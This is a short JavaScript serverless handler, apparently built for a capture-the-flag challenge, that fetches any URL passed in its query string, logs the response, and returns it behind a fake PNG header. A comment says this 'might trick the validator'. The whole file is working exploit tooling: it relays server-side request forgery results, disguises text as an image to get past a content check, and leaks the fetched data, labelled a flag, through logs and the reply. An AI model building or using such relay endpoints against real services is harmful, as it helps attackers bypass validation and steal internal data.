// Returns a PNG image with proper headers
// This endpoint can be used to redirect or serve images

export default async function handler(req, res) {
  const target = req.query.url;
  
  console.log('=== FLAG FETCH ===');
  console.log('Target URL:', target);
  
  if (target) {
    try {
      // Fetch the target URL and return whatever we get as a PNG
      const response = await fetch(target);
      const text = await response.text();
      
      console.log('Response:', text.substring(0, 500));
      console.log('==================');
      
      // Create a simple PNG with the text embedded in metadata
      // Or just return the response with image headers
      res.setHeader('Content-Type', 'image/png');
      
      // Return minimal PNG header + the actual content
      // This might trick the validator
      const pngHeader = Buffer.from([
        0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A
      ]);
      
      res.send(Buffer.concat([pngHeader, Buffer.from(text)]));
    } catch (e) {
      console.log('Error:', e.message);
      res.status(500).json({ error: e.message });
    }
  } else {
    // Return a simple PNG
    const png = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
      'base64'
    );
    res.setHeader('Content-Type', 'image/png');
    res.send(png);
  }
}
